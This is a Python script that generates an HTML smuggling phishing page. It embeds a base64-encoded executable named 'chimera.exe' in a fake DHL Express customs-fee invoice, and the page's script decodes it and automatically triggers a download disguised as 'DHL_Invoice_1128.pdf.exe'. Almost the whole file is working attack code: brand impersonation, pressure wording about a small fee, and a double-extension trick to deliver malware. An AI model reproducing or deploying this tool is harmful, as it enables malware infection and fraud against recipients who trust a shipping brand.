import base64
import os

def generate_html_smuggling():
    exe_path = "chimera.exe"
    if not os.path.exists(exe_path):
        print("[!] chimera.exe not found! Place it in this folder.")
        return

    with open(exe_path, "rb") as f:
        base64_payload = base64.b64encode(f.read()).decode('utf-8')

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>DHL Express - Shipment Invoice #DH4839210</title>
<style>
    body {{margin:0;padding:0;background:#f4f4f4;font-family:Arial,sans-serif}}
    .container {{max-width:680px;margin:20px auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,0.1)}}
    .header {{background:#d40511;color:white;padding:20px;text-align:center}}
    .header img {{height:50px}}
    .content {{padding:30px}}
    .alert {{background:#fff8e1;border-left:5px solid #ff9800;padding:15px;margin:20px 0;font-weight:600}}
    .btn {{display:inline-block;background:#d40511;color:white;padding:14px 30px;text-decoration:none;border-radius:5px;font-weight:bold}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/DHL_Express_Logo.svg" alt="DHL">
    <h1>Shipment Invoice & Customs Documentation</h1>
  </div>
  <div class="content">
    <h2>Dear Valued Customer,</h2>
    <p>Your package <strong>#DH4839210</strong> requires a customs fee of <strong>USD 4.99</strong> before delivery.</p>
    <div class="alert">Action Required: Download invoice to proceed with payment.</div>
    <p style="text-align:center;">
      <a href="#" class="btn" id="dl">Download Invoice & Payment Form (PDF)</a>
    </p>
  </div>
</div>

<script>
var b64 = "{base64_payload}";
var bin = atob(b64);
var len = bin.length;
var arr = new Uint8Array(len);
for(var i=0;i<len;i++) arr[i] = bin.charCodeAt(i);
var blob = new Blob([arr], {{type:'octet/stream'}});
var url = URL.createObjectURL(blob);
document.getElementById('dl').href = url;
document.getElementById('dl').download = "DHL_Invoice_1128.pdf.exe";
document.getElementById('dl').click();
</script>
</body>
</html>"""

    os.makedirs("example_payloads", exist_ok=True)
    with open("example_payloads/invoice_dhl_1128.html", "w", encoding="utf-8") as f:
        f.write(html_content)
    print("[+] HTML Smuggling payload created: example_payloads/invoice_dhl_1128.html")

generate_html_smuggling()